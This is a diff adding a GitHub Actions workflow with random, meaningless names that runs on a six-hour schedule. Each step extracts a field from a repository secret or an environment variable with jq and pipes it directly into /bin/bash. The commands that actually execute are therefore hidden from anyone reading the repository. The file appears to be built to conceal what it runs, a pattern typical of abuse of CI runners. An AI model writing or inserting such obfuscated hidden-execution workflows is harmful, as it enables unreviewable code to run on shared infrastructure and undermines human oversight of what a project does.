@@ -1,0 +1,27 @@
+name: wudazhouo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wudazhouo
+        env:
+          gnvlx16: ${{ secrets.gnvlx16 }}
+        run: |
+          echo $gnvlx16 | jq -r .bq4207 | /bin/bash
+          echo $masv40 | jq -r .w96 | /bin/bash
+          echo $pnk07 | jq -r .kb0948 | /bin/bash
+          echo $v1 | jq -r .ap006 | /bin/bash
+          echo $dxnr622 | jq -r .eogat0441 | /bin/bash
+          echo $kor75579 | jq -r .am52670 | /bin/bash
+          echo $avbfx62 | jq -r .vy19544 | /bin/bash
+          echo $giuvl6306 | jq -r .twdoh08720 | /bin/bash
+          echo $spik3608 | jq -r .adehv43 | /bin/bash
+          echo $nzht05 | jq -r .prvu39 | /bin/bash
+
